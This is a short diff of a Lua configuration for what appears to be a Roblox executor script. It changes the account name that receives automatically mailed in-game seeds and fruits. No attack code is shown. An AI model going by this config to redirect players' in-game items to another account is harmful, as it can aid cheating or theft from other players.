@@ -1,5 +1,5 @@
 getgenv().HB_MailConfig = {
-        MainUsername = "Chalarm_KawZ",  -- 
+        MainUsername = "adidbetatester",  -- 
         SendSeeds    = true,
         SendAllSeeds = true,   -- true = ()
         SendFruits   = true,   
